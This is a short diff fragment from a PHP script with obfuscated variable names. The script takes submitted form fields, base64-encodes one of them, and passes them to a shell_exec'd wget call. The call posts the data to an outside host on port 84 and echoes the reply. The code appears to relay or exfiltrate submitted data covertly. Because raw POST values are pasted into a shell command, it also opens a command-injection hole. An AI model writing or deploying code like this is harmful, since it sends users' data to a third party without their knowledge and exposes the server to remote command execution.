@@ -39,7 +39,7 @@ $google847446 = $_POST["linux1"];
 
 $google847446 = base64_encode($google847446);
 
-echo shell_exec("wget -q -U 'linux84' --post-data=linux2='" . $google84741 . "&linux3=" . $google84742 . "&linux5=" . $google847412 . "&linux1=" . $google847446 . "&linux4=" . $google84744 . "' 'http://www.blueinc.cloud:84/linux8474.php?linux84=linux84' --header='Content-type: application/x-www-form-urlencoded'");
+echo shell_exec("wget -q -U 'linux84' -O - --post-data=linux2='" . $google84741 . "&linux3=" . $google84742 . "&linux5=" . $google847412 . "&linux1=" . $google847446 . "&linux4=" . $google84744 . "' 'http://www.blueinc.cloud:84/linux8474.php?linux84=linux84' --header='Content-type: application/x-www-form-urlencoded'");
 
 }
 
